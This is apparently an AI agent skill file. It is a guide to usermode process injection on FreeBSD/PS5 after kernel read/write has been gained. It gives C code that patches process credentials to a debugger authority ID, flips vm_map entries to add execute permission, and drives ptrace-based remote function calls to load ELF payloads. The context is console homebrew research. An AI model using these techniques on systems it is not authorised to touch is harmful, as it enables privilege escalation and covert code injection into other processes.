---
name: freebsd-ptrace-rfi-injection
description: Guide for FreeBSD/PS5 usermode process injection using ptrace RFI and vm_map PROT_EXEC bypass. Use this skill whenever the user mentions FreeBSD exploitation, PS5 payload injection, ptrace-based RFI, vm_map protection bypass, kernel R/W primitives, process injection, ELF injection, or any scenario involving usermode code execution on FreeBSD-based systems. This skill covers the complete workflow from kernel primitive usage to payload delivery.
---

# FreeBSD ptrace RFI and vm_map PROT_EXEC Bypass

A practical guide for usermode process injection on FreeBSD-based systems (including PS5) when you have kernel read/write primitives.

## What This Skill Does

This skill helps you:
- Patch process credentials to enable ptrace/mdbg debugging authority
- Discover target processes via kernel allproc list traversal
- Bypass PROT_EXEC restrictions by modifying vm_map entries in kernel memory
- Perform Remote Function Invocation (RFI) using ptrace to call functions inside target processes
- Load and execute arbitrary ELF payloads in target processes
- Cleanly detach after payload execution

## Prerequisites

**Required:**
- Kernel read/write primitives (from an exploit chain)
- Knowledge of target firmware/kernel version (offsets are version-specific)
- Access to target system (local or network)

**Assumptions:**
- You already have kernel R/W capabilities
- Target is FreeBSD-based (PS5, FreeBSD derivatives)
- Hypervisor allows data-only kernel writes (no CR0.WP/CR4.SMEP modifications)

## Core Workflow

### Step 1: Process Discovery via allproc

FreeBSD maintains a doubly-linked list of processes in kernel `.data` at `allproc`. Use your kernel read primitive to iterate it:

```c
struct proc* find_proc_by_name(const char* proc_name) {
    uint64_t next = 0;
    kernel_copyout(KERNEL_ADDRESS_ALLPROC, &next, sizeof(uint64_t));
    struct proc* proc = malloc(sizeof(struct proc));
    
    do {
        kernel_copyout(next, (void*)proc, sizeof(struct proc));
        if (!strcmp(proc->p_comm, proc_name)) return proc;
        kernel_copyout(next, &next, sizeof(uint64_t));
    } while (next);
    
    free(proc);
    return NULL;
}
```

**Key points:**
- `KERNEL_ADDRESS_ALLPROC` is firmware-dependent
- `p_comm` is a fixed-size process name field
- Consider PID-based lookups if name matching is unreliable

### Step 2: Elevate Credentials for Debugging

On PS5, `struct ucred` includes an Authority ID field. Writing the debugger Authority ID grants ptrace/mdbg over other processes:

```c
void set_ucred_to_debugger() {
    struct proc* proc = get_proc_by_pid(getpid());
    if (proc) {
        uintptr_t ptrace_authid = 0x4800000000010003ULL; // debugger Authority ID
        kernel_copyin(&ptrace_authid, (uintptr_t)proc->p_ucred + 0x58, sizeof(uintptr_t));
        free(proc);
    }
}
```

**Important:**
- Offset `0x58` is PS5 firmware-specific; verify per version
- After this write, your injector can attach to user processes via ptrace/mdbg

### Step 3: Bypass PROT_EXEC via vm_map Modification

Userland `mmap` may be constrained to `PROT_READ|PROT_WRITE`. FreeBSD tracks address space in `vm_map` entries. Modify kernel-owned metadata to add execute permission:

```c
struct vm_map_entry {
    struct vm_map_entry *prev, *next, *left, *right;
    vm_offset_t start, end, avail_ssize;
    vm_size_t adj_free, max_free;
    union vm_map_object object;
    vm_ooffset_t offset;
    vm_eflags_t eflags;
    vm_prot_t protection;      // <-- Modify this
    vm_prot_t max_protection;  // <-- And this if needed
    vm_inherit_t inheritance;
    int wired_count;
    vm_pindex_t lastr;
};
```

**Implementation approach:**
1. Locate the target's `vm_map` structure
2. Walk entries (linear via `next` or BST via `left/right` for O(log n))
3. Find the entry covering your RW region
4. Set `entry->protection |= PROT_EXEC`
5. Optionally set `entry->max_protection |= PROT_EXEC`

This bypasses userland mmap policy by editing kernel metadata directly.

### Step 4: Remote Function Invocation (RFI)

FreeBSD lacks Windows-style `VirtualAllocEx`/`CreateRemoteThread`. Instead, drive the target to call functions on itself under ptrace control:

**RFI Sequence:**
1. Attach to target process (`PTRACE_ATTACH` or PS5-specific mdbg)
2. Select a thread and save its context (registers, PC, SP, flags)
3. Write argument registers per ABI (x86_64 SysV or arm64 AAPCS64)
4. Set PC to target function address
5. Single-step or continue until controlled stop (breakpoint/signal)
6. Read return values from registers
7. Restore original context and continue

**Example - Calling ELF loader:**
```c
intptr_t entry = elfldr_load(target_pid, (uint8_t*)elf_in_target);
intptr_t args  = elfldr_payload_args(target_pid);
printf("[+] ELF entrypoint: %#02lx\n[+] Payload Args: %#02lx\n", entry, args);
```

The loader maps segments, resolves imports, applies relocations, and returns:
- Entry point (often CRT bootstrap)
- Opaque `payload_args` pointer for your stager

### Step 5: Threaded Stager and Clean Detach

Create a minimal stager that spawns a pthread for your payload, then triggers a breakpoint for clean detach:

```c
int __attribute__((section(".stager_shellcode$1"))) stager(SCEFunctions* functions) {
    pthread_t thread;
    functions->pthread_create_ptr(&thread, 0,
        (void*(*)(void*))functions->elf_main, functions->payload_args);
    asm("int3");
    return 0;
}
```

**Key points:**
- `SCEFunctions`/`payload_args` provided by loader/SDK glue
- After breakpoint and detach, payload continues in its own thread
- This prevents deadlock and allows clean injector exit

## End-to-End Pipeline

A working implementation typically includes:

**Injector Server (NineS example):**
- Listens on TCP port (e.g., 9033)
- Receives header with target process name + ELF image
- Handles injection workflow

**Client Script:**
```bash
python3 ./send_injection_elf.py SceShellUI hello_world.elf <PS5_IP>
```

**Hello-world payload:**
```c
#include <stdio.h>
#include <unistd.h>
#include <ps5/klog.h>

int main() {
    klog_printf("Hello from PID %d\n", getpid());
    return 0;
}
```

## Practical Considerations

### Firmware-Specific Offsets
- `allproc` address
- `ucred` authority offset
- `vm_map` layout
- ptrace/mdbg details

**Always verify offsets per firmware version.**

### Hypervisor Protections
- XOM (execute-only `.text`) prevents reading/writing kernel code
- Clearing CR0.WP or disabling CR4.SMEP causes vmexit (crash)
- **Only data-only kernel writes are viable**

### Alternative: JIT Memory
Some processes expose PS5 JIT APIs to allocate executable pages. The vm_map protection flip removes the need to rely on JIT/mirroring tricks.

### Robustness
- Keep register save/restore robust
- On failure, you can deadlock or crash the target
- Test thoroughly before production use

## Public Tooling

| Tool | Purpose | Repository |
|------|---------|------------|
| PS5 SDK | Dynamic linking, kernel R/W wrappers, vm_map helpers | https://github.com/ps5-payload-dev/sdk |
| elfldr | ELF loader for injection | https://github.com/ps5-payload-dev/elfldr |
| NineS | Injector server | https://github.com/buzzer-re/NineS/ |
| playstation_research_utils | Utilities/vm_map helpers | https://github.com/buzzer-re/playstation_research_utils |
| Mira | Related project | https://github.com/OpenOrbis/mira-project |
| gdbsrv | GDB server | https://github.com/ps5-payload-dev/gdbsrv |

## References

- [Usermode ELF injection on the PlayStation 5](https://reversing.codes/posts/PlayStation-5-ELF-Injection/)
- [FreeBSD klog reference](https://lists.freebsd.org/pipermail/freebsd-questions/2006-October/134234.html)

## When to Use This Skill

Use this skill when:
- You have kernel R/W primitives on FreeBSD/PS5 and need process injection
- You need to bypass PROT_EXEC restrictions on userland mappings
- You want to perform ptrace-based RFI on FreeBSD systems
- You're developing payloads for PS5 or FreeBSD-based systems
- You need to understand vm_map structure and protection bypass techniques
- You're working on post-exploitation after gaining kernel access

## Common Pitfalls

1. **Wrong offsets:** Always verify structure offsets for your specific firmware/kernel version
2. **Hypervisor violations:** Don't attempt CR0.WP/CR4.SMEP modifications
3. **Register corruption:** Ensure robust save/restore in RFI sequences
4. **Thread selection:** Choose appropriate threads for injection (avoid critical system threads)
5. **Memory layout:** Verify your RW region exists before attempting PROT_EXEC flip
